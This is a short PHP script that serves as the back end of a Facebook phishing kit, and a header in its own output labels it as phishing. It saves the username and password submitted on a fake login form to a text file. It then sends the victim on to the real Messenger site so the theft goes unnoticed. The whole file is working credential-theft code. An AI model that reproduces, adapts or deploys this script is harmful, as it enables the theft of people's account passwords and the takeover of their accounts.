<?php
file_put_contents("data.txt", "\n(THANK YOU!! FOR USE MY PHISHING)\n\nFacebook:\nUsername: " . $_POST['username'] . " \nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.messenger.com/desktop');
exit();
?>